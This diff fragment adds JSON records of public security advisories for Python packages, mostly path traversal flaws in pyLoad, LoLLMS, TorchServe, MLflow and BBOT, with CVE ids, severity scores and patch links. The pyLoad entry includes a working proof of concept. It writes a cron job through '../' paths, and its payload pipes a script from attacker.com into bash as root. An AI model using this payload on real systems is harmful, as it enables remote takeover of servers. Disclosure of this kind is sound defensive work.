+    "patch_urls": [
+      "https://github.com/invoke-ai/InvokeAI/pull/8548/commits/eff565ae6ace1c8458f187245690bff0513f1b9e"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "invokeai",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 6.7.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-48rp-jc79-2264",
+    "cve_id": "CVE-2025-54802",
+    "summary": "pyLoad CNL Blueprint allows Path Traversal through `dlc_path` which leads to Remote Code Execution (RCE)",
+    "description": "### Summary\n**Path Traversal in pyLoad-ng CNL Blueprint via `package` parameter allows Arbitrary File Write leading to Remote Code Execution (RCE)** The `addcrypted` endpoint in `pyload-ng` suffers from an unsafe path construction vulnerability, allowing unauthenticated attackers to write arbitrary files outside the designated storage directory. This can be abused to overwrite critical system files, including cron jobs and systemd services, leading to privilege escalation and remote code execution as root.\n\n\n\n### Details\n* **Endpoint**: `POST /addcrypted`\n* **Issue**: `src/pyload/webui/app/blueprints/cnl_blueprint.py`\n\n#### Vulnerable Code\n```python\n dlc_path = os.path.join( \n     dl_path, package.replace(\"/\", \"\").replace(\"\\\\\", \"\").replace(\":\", \"\") + \".dlc\" \n ) \n dlc = flask.request.form[\"crypted\"].replace(\" \", \"+\") \n with open(dlc_path, mode=\"wb\") as fp: \n```\n\n### PoC\n```http\nPOST /addcrypted HTTP/1.1\nHost: localhost:8000\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 107\n\npackage=../../../../etc/cron.d/payload&crypted=KioqICogKiAqKiByb290IGN1cmwgLXMgaHR0cDovL2F0dGFja2VyLmNvbS9yLnNoIHwgYmFzaA==\n```\n\nDecoded payload:\n```bash\n* * * * * root curl -s http://attacker.com/r.sh | bash\n```\n\n**Send crafted POST**\n```python\nimport requests, base64\n\npayload = \"* * * * * root curl http://attacker.com/rev.sh | bash\"\nb64 = base64.b64encode(payload.encode()).decode()\n\nrequests.post(\"http://localhost:8000/addcrypted\", data={\n    \"package\": \"../../../../etc/cron.d/exploit\",\n    \"crypted\": b64\n})\n```\n\n\n### Impact\nThe vulnerability allows unauthenticated attackers to write arbitrary files outside the intended directory via a path traversal flaw in the `addcrypted` endpoint in `pyload-ng` parameter. when exploited, it enables remote code execution as **root** by injecting malicious cron jobs or system files, turning a simple file upload endpoint into a full system compromise vector.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-22"
+    ],
+    "published_at": "2025-08-04T15:57:48Z",
+    "references": [
+      "https://github.com/pyload/pyload/security/advisories/GHSA-48rp-jc79-2264",
+      "https://github.com/pyload/pyload/pull/4596",
+      "https://github.com/pyload/pyload/commit/70a44fe02c03bce92337b5d370d2a45caa4de3d4",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-54802",
+      "https://github.com/advisories/GHSA-48rp-jc79-2264"
+    ],
+    "patch_urls": [
+      "https://github.com/pyload/pyload/pull/4596",
+      "https://github.com/pyload/pyload/commit/70a44fe02c03bce92337b5d370d2a45caa4de3d4"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "pyload-ng",
+        "ecosystem": "pip",
+        "vulnerable_range": "<= 0.5.0b3.dev89"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-3x47-w4rx-6pm7",
+    "cve_id": "CVE-2024-3429",
+    "summary": "LoLLMS Path Traversal vulnerability",
+    "description": "A path traversal vulnerability exists in the parisneo/lollms application, specifically within the `sanitize_path_from_endpoint` and `sanitize_path` functions in `lollms_core\\lollms\\security.py`. This vulnerability allows for arbitrary file reading when the application is running on Windows. The issue arises due to insufficient sanitization of user-supplied input, enabling attackers to bypass the path traversal protection mechanisms by crafting malicious input. Successful exploitation could lead to unauthorized access to sensitive files, information disclosure, and potentially a denial of service (DoS) condition by including numerous large or resource-intensive files. This vulnerability affects the latest version prior to 9.5.0.",
+    "severity": "high",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-22",
+      "CWE-29"
+    ],
+    "published_at": "2024-06-06T21:30:37Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-3429",
+      "https://github.com/parisneo/lollms/commit/f4424cfc3d6dfb3ad5ac17dd46801efe784933e9",
+      "https://huntr.com/bounties/fd8f50c8-17f0-40be-a2c6-bb8d80f7c409",
+      "https://github.com/advisories/GHSA-3x47-w4rx-6pm7"
+    ],
+    "patch_urls": [
+      "https://github.com/parisneo/lollms/commit/f4424cfc3d6dfb3ad5ac17dd46801efe784933e9"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "lollms",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 9.5.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-wxcx-gg9c-fwp2",
+    "cve_id": "CVE-2024-35198",
+    "summary": "TorchServe vulnerable to bypass of allowed_urls configuration",
+    "description": "### Impact\nTorchServe's check on allowed_urls configuration can be by-passed if the URL contains characters such as \"..\" but it does not prevent the model from being downloaded into the model store. Once a file is downloaded, it can be referenced without providing a URL the second time, which effectively bypasses the allowed_urls security check. Customers using PyTorch inference Deep Learning Containers (DLC) through Amazon SageMaker and EKS are not affected.\n\n### Patches\nThis issue in TorchServe has been fixed by validating the URL without characters such as \"..\" before downloading: [#3082](https://github.com/pytorch/serve/pull/3082).\n\nTorchServe release 0.11.0 includes the fix to address this vulnerability.\n\n### References\n* [#3082](https://github.com/pytorch/serve/pull/3082)\n* [TorchServe release v0.11.0](https://github.com/pytorch/serve/releases/tag/v0.11.0)\n\nThank Kroll Cyber Risk for for responsibly disclosing this issue.\n\nIf you have any questions or comments about this advisory, we ask that you contact AWS Security via our [vulnerability reporting page](https://aws.amazon.com/security/vulnerability-reporting) or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com). Please do not create a public GitHub issue.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-22",
+      "CWE-706"
+    ],
+    "published_at": "2024-07-18T22:03:30Z",
+    "references": [
+      "https://github.com/pytorch/serve/security/advisories/GHSA-wxcx-gg9c-fwp2",
+      "https://github.com/pytorch/serve/pull/3082",
+      "https://github.com/pytorch/serve/commit/cdba0fd449c2fd23dcf37c54c0784035541d5114",
+      "https://github.com/pytorch/serve/releases/tag/v0.11.0",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-35198",
+      "https://github.com/advisories/GHSA-wxcx-gg9c-fwp2"
+    ],
+    "patch_urls": [
+      "https://github.com/pytorch/serve/pull/3082",
+      "https://github.com/pytorch/serve/commit/cdba0fd449c2fd23dcf37c54c0784035541d5114"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "torchserve",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 0.11.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-xg73-94fp-g449",
+    "cve_id": "CVE-2023-1177",
+    "summary": "mlflow is vulnerable to remote file access in `mlflow server` and `mlflow ui` CLIs",
+    "description": "### Impact\n\nUsers of the MLflow Open Source Project who are hosting the MLflow Model Registry using the `mlflow server` or `mlflow ui` commands using an MLflow version older than MLflow 2.2.1 may be vulnerable to a remote file access exploit if they are not limiting who can query their server (for example, by using a cloud VPC, an IP allowlist for inbound requests, or authentication / authorization middleware).\n\nThis issue only affects users and integrations that run the `mlflow server` and `mlflow ui` commands. Integrations that do not make use of `mlflow server` or `mlflow ui` are unaffected; for example, the Databricks Managed MLflow product and MLflow on Azure Machine Learning do not make use of these commands and are not impacted by these vulnerabilities in any way.\n\nThe vulnerability detailed in https://nvd.nist.gov/vuln/detail/CVE-2023-1177 enables an actor to download arbitrary files unrelated to MLflow from the host server, including any files stored in remote locations to which the host server has access.\n\n### Patches\nThis vulnerability has been patched in MLflow 2.2.1, which was released to PyPI on March 2nd, 2023. If you are using `mlflow server` or `mlflow ui` with the MLflow Model Registry, we recommend upgrading to MLflow 2.2.1 as soon as possible.\n\n### Workarounds\nIf you are using the MLflow open source `mlflow server` or `mlflow ui` commands, we strongly recommend limiting who can access your MLflow Model Registry and MLflow Tracking servers using a cloud VPC, an IP allowlist for inbound requests, authentication / authorization middleware, or another access restriction mechanism of your choosing.\n\nIf you are using the MLflow open source `mlflow server` or `mlflow ui` commands, we also strongly recommend limiting the remote files to which your MLflow Model Registry and MLflow Tracking servers have access. For example, if your MLflow Model Registry or MLflow Tracking server uses cloud-hosted blob storage for MLflow artifacts, make sure to restrict the scope of your server's cloud credentials such that it can only access files and directories related to MLflow.\n\n### References\nMore information about the vulnerability is available at https://nvd.nist.gov/vuln/detail/CVE-2023-1177.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-22",
+      "CWE-29"
+    ],
+    "published_at": "2023-03-24T22:01:09Z",
+    "references": [
+      "https://github.com/mlflow/mlflow/security/advisories/GHSA-xg73-94fp-g449",
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-1177",
+      "https://github.com/mlflow/mlflow/commit/7162a50c654792c21f3e4a160eb1a0e6a34f6e6e",
+      "https://huntr.dev/bounties/1fe8f21a-c438-4cba-9add-e8a5dab94e28",
+      "https://github.com/mlflow/mlflow/pull/7891/commits/7162a50c654792c21f3e4a160eb1a0e6a34f6e6e",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/mlflow/PYSEC-2023-29.yaml",
+      "https://github.com/advisories/GHSA-xg73-94fp-g449"
+    ],
+    "patch_urls": [
+      "https://github.com/mlflow/mlflow/commit/7162a50c654792c21f3e4a160eb1a0e6a34f6e6e",
+      "https://github.com/mlflow/mlflow/pull/7891/commits/7162a50c654792c21f3e4a160eb1a0e6a34f6e6e"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "mlflow",
+        "ecosystem": "pip",
+        "vulnerable_range": "<= 2.2.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-h6m2-r6h9-4c44",
+    "cve_id": "CVE-2025-10283",
+    "summary": "BBOT's insufficient sanitization issues in gitdumper.py can lead to RCE",
+    "description": "### Summary\n\nbbot's `gitdumper.py` insufficiently sanitises a `.git/config` file, leading to Remote Code Execution (RCE).\n\nbbot's `gitdumper.py` can be made to consume a malicious `.git/index` file, leading to arbitrary file write which can be used to achieve Remote Code Execution (RCE).\n\n### Impact\n\nA user who uses bbot to scan a malicious webserver may have arbitrary code executed on their system.",
+    "severity": "critical",
+    "cvss_score": 9.7,
+    "cwes": [
+      "CWE-22"
+    ],
+    "published_at": "2025-10-09T22:29:46Z",
+    "references": [
+      "https://github.com/blacklanternsecurity/bbot/security/advisories/GHSA-h6m2-r6h9-4c44",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-10283",
+      "https://github.com/blacklanternsecurity/bbot/commit/0ede97fa887de33fcfd1378b4213a09c21dc6140",
+      "https://blog.blacklanternsecurity.com/p/bbot-security-advisory-gitdumper",
+      "https://github.com/advisories/GHSA-h6m2-r6h9-4c44"
+    ],
+    "patch_urls": [
+      "https://github.com/blacklanternsecurity/bbot/commit/0ede97fa887de33fcfd1378b4213a09c21dc6140"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "bbot",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 2.7.0"
+      }
+    ]
+  }
+]
